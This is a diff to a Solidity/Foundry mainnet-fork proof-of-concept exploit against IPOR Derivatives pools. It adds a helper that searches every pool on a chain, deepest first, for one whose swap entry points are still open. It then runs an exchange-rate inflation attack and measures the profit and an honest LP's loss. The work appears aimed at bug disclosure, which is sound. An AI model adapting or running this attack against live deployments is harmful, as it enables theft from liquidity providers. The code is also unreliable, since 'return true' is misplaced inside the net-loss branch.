@@ -2,7 +2,7 @@
 pragma solidity 0.8.26;
 
 // ============================================================================
-//  IPOR Derivatives — mainnet-fork PoC  (v3.2)
+//  IPOR Derivatives — mainnet-fork PoC  (v3.3)
 //
 //  Bug under test
 //  --------------
@@ -14,11 +14,20 @@ pragma solidity 0.8.26;
 //  supply) inflates; whoever holds ipTokens redeems them against the real
 //  treasury assets.
 //
-//  What v3.2 changes vs v3.1
-//  -------------------------
-//  * the live router reverts IPOR_015 (METHOD_PAUSED) on the 90-day open
-//    entry points, so the tenor is now a parameter (TENOR=28|60|90) and every
-//    open selector is checked against router.paused(selector) before use.
+//  What v3.3 changes vs v3.2 (v3.2 was run on the live forks, block 26,310,577)
+//  ---------------------------------------------------------------------------
+//  * the pause map is per SELECTOR, not per protocol: Arbitrum USDC is closed in
+//    both arities, Arbitrum wstETH is closed in 6-arg but OPEN in 5-arg,
+//    Ethereum USDC/USDT/DAI are fully OPEN, Base is closed. test_1_attack now
+//    walks EVERY pool on the chain (deepest first, TARGET=<tag> to force one)
+//    and only gives up when nothing on the chain opens.
+//  * _depth() falls back to the legacy AmmLib formula
+//        LP = storage.liquidityPool + vaultActual - storage.vault
+//    for the Ethereum treasuries (AmmTreasury, no getLiquidityPoolBalance), and
+//    prints which source it used. Never quote a depth labelled
+//    "rate*supply (soap-contaminated)" — that is the attacked quantity.
+//  * a second, honest LP is used as the victim: it deposits before the attack
+//    and redeems after it, so the loss is a measured number, not an inference.
 //  * test_3_pause prints the pause state of ALL 18 open entry points plus the
 //    liquidity/close ones, and proves whether the pause can be side-stepped by
 //    calling the open-swap service directly (it cannot: the service reads the
@@ -291,6 +300,11 @@ contract IporForkTest is Test {
     }
 
     // ----------------------------------------------------------------- helpers
+    function toInt256(uint256 x) internal pure returns (int256) {
+        require(x <= uint256(type(int256).max), "int overflow");
+        return int256(x);
+    }
+
     function _eq(string memory a, string memory b) internal pure returns (bool) {
         return keccak256(bytes(a)) == keccak256(bytes(b));
     }
@@ -374,19 +388,36 @@ contract IporForkTest is Test {
         }
     }
 
-    /// @dev LP balance exactly as the swap engine sees it (wad).
+    /// @dev ammStorage for a pool: from the table, or from AmmTreasury.getConfiguration()
+    function _ammStorageOf(Pool memory p) internal view returns (address) {
+        if (p.ammStorage != address(0)) return p.ammStorage;
+        try ITreasury(p.treasury).getConfiguration() returns (address, uint256, address st, address, address) {
+            return st;
+        } catch {}
+        return address(0);
+    }
+
+    /// @dev LP balance (wad) as the swap engine sees it, i.e. WITHOUT soap.
+    ///      1. AmmTreasuryBaseV2.getLiquidityPoolBalance() when it exists;
+    ///      2. otherwise the AmmLib.getAccruedBalance() formula, which is what the
+    ///         legacy Ethereum treasuries use:
+    ///           LP = storage.liquidityPool + vaultActual - storage.vault
+    ///      3. last resort: rate * supply (= LP - soap, contaminated by the attack).
     function _depth(Pool memory p) internal view returns (uint256 d, string memory src) {
         try ITreasury(p.treasury).getLiquidityPoolBalance() returns (uint256 v) {
-            return (v, "getLiquidityPoolBalance");
+            if (v > 0) return (v, "getLiquidityPoolBalance");
         } catch {}
-        if (p.ammStorage != address(0)) {
-            try IAmmStorageLike(p.ammStorage).getBalance() returns (AmmBalance memory b) {
-                if (b.liquidityPool > 0) return (b.liquidityPool, "AmmStorage.liquidityPool");
+        address st = _ammStorageOf(p);
+        if (st != address(0)) {
+            try IAmmStorageLike(st).getBalance() returns (AmmBalance memory b) {
+                (, uint256 vaultActual) = _cash(p);
+                int256 lp = toInt256(b.liquidityPool) + toInt256(vaultActual) - toInt256(b.vault);
+                if (lp > 0) return (uint256(lp), "AmmLib accrued: liquidityPool + vaultActual - vault");
             } catch {}
         }
         try router.getIpTokenExchangeRate(p.asset) returns (uint256 rate) {
             d = (rate * IERC20Like(p.ipToken).totalSupply()) / 1e18;
-            src = "rate*supply";
+            src = "rate*supply (soap-contaminated)";
         } catch {}
     }
 
@@ -546,6 +577,7 @@ contract IporForkTest is Test {
             console2.log("  depth source        ", src);
             console2.log("  ipToken supply (wad)", supply);
             console2.log("  exchange rate (wad)", rate);
+            console2.log("  rate*supply (wad)   ", (rate * supply) / 1e18);
             console2.log("  LP balance USD      ", _usd(p, d));
             console2.log("  redeemable USD      ", _usd(p, idle + vault));
             // what can be opened right now?
@@ -746,7 +778,68 @@ contract IporForkTest is Test {
     // ============================================================ 1. attack
     function test_1_attack() public {
         Pool[] memory ps = _pools();
-        Pool memory p = ps[_target(ps)];
+
+        // ---- test-only: point the risk-indicator verifier at our key
+        address owner = router.owner();
+        vm.prank(owner);
+        try router.setMessageSigner(signer) {} catch {
+            console2.log("!! setMessageSigner reverted");
+            revert("blocked: no risk-indicator signer");
+        }
+        console2.log("NOTE owner-only setMessageSigner is a TEST STAND-IN for the public");
+        console2.log("     risk-indicator payload any user can fetch from IPOR's API.");
+        console2.log("");
+
+        // ---- order the pools: TARGET first (if set), otherwise deepest first.
+        //      A pool whose open-swap selectors are all paused is skipped, and the
+        //      next pool is tried, because the pause map is per-selector, not
+        //      per-protocol: measured at block 26,310,577 Arbitrum USDC is closed
+        //      while Arbitrum wstETH (5-arg) and Ethereum USDC/USDT/DAI are open.
+        uint256 n = ps.length;
+        uint256[] memory order = new uint256[](n);
+        for (uint256 i; i < n; i++) order[i] = i;
+        for (uint256 i = 1; i < n; i++) {
+            uint256 key = order[i];
+            (uint256 kd,) = _depth(ps[key]);
+            uint256 kusd = _usd(ps[key], kd);
+            uint256 j = i;
+            while (j > 0) {
+                (uint256 jd,) = _depth(ps[order[j - 1]]);
+                if (_usd(ps[order[j - 1]], jd) >= kusd) break;
+                order[j] = order[j - 1];
+                j--;
+            }
+            order[j] = key;
+        }
+        (string memory tgt, bool hasTgt) = _envS("TARGET");
+        if (hasTgt) {
+            for (uint256 i; i < n; i++) {
+                if (_eq(ps[order[i]].tag, tgt) && i > 0) {
+                    uint256 tmp = order[0];
+                    order[0] = order[i];
+                    order[i] = tmp;
+                }
+            }
+        }
+
+        bool done;
+        for (uint256 k; k < n && !done; k++) {
+            console2.log("==================================================");
+            console2.log("attempt", k + 1);
+            console2.log("  of pools:", n);
+            console2.log("  ->", ps[order[k]].name);
+            done = _attackOn(ps[order[k]]);
+            if (!done) {
+                console2.log("  pool skipped: no open swap path on this block");
+                console2.log("");
+            }
+        }
+        require(done, "no pool on this chain had an open swap path");
+    }
+
+
+
+    function _attackOn(Pool memory p) internal returns (bool success) {
 
         console2.log("target:", p.name);
         console2.log("block", block.number);
@@ -760,6 +853,15 @@ contract IporForkTest is Test {
         console2.log("  depth0 USD  ", _usd(p, depth0));
         console2.log("idle0  (wad)", idle0);
         console2.log("vault0 (wad)", vault0);
+        {
+            address st = _ammStorageOf(p);
+            if (st != address(0)) {
+                try IAmmStorageLike(st).getBalance() returns (AmmBalance memory sb) {
+                    console2.log("  storage liquidityPool (wad)", sb.liquidityPool);
+                    console2.log("  storage vault (wad)        ", sb.vault);
+                } catch {}
+            }
+        }
         console2.log("ipToken supply", supply0);
         console2.log("rate0", rate0);
 
@@ -783,16 +885,6 @@ contract IporForkTest is Test {
         console2.log("plan: days held       ", days_);
         console2.log("");
 
-        // ---- test-only: point the risk-indicator verifier at our key
-        address owner = router.owner();
-        vm.prank(owner);
-        try router.setMessageSigner(signer) {} catch {
-            console2.log("!! setMessageSigner reverted");
-            revert("blocked: no risk-indicator signer");
-        }
-        console2.log("NOTE owner-only setMessageSigner is a TEST STAND-IN for the public");
-        console2.log("     risk-indicator payload any user can fetch from IPOR's API.");
-        console2.log("");
 
         // ---- fund: exactly what the plan needs, so that
         //      net = balanceOf(attacker) - float0 is a real profit, not an
@@ -847,7 +939,7 @@ contract IporForkTest is Test {
             atkLp /= 2;
         }
         ipBal = IERC20Like(p.ipToken).balanceOf(attacker);
-        if (ipBal == 0) revert("could not enter the pool as LP");
+        if (ipBal == 0) return false;
         console2.log("attacker ipTokens", ipBal);
         console2.log("rate after LP entries", _rate(p));
 
@@ -912,7 +1004,7 @@ contract IporForkTest is Test {
             }
         }
         if (!opened) {
-            revert("no open path: every direction/tenor is paused or rejected on this chain");
+            return false;
         }
 
         console2.log("swapId", swapId);
@@ -920,8 +1012,9 @@ contract IporForkTest is Test {
         console2.log("rate after swap", _rate(p));
         (uint256 depthSwap,) = _depth(p);
         console2.log("LP balance after swap (wad)", depthSwap);
-        if (p.ammStorage != address(0)) {
-            try IAmmStorageSwap(p.ammStorage).getSwap(uint8(usedDir), swapId) returns (SwapData memory sw) {
+        address swapStorage = _ammStorageOf(p);
+        if (swapStorage != address(0)) {
+            try IAmmStorageSwap(swapStorage).getSwap(uint8(usedDir), swapId) returns (SwapData memory sw) {
                 console2.log("  swap.collateral (wad)", sw.collateral);
                 console2.log("  swap.notional   (wad)", sw.notional);
                 console2.log("  swap.ibtQty     (wad)", sw.ibtQuantity);
@@ -1046,6 +1139,8 @@ contract IporForkTest is Test {
         } else {
             console2.log("  NET LOSS (wad)", _wad(neg, p.decimals));
             console2.log("  NET LOSS USD", _usd(p, _wad(neg, p.decimals)));
+
+        return true;
         }
     }
 }
